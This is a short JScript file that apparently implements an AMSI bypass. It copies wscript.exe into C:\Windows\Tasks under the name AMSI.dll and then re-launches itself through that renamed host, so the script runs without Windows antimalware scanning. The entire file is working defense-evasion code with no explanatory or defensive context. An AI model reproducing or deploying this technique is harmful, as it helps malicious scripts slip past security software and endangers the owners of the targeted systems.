var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try{
  if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0){
    throw new Error(1, '');
  }
}catch(e){
  filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
  sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);WScript.Quit(1);
}
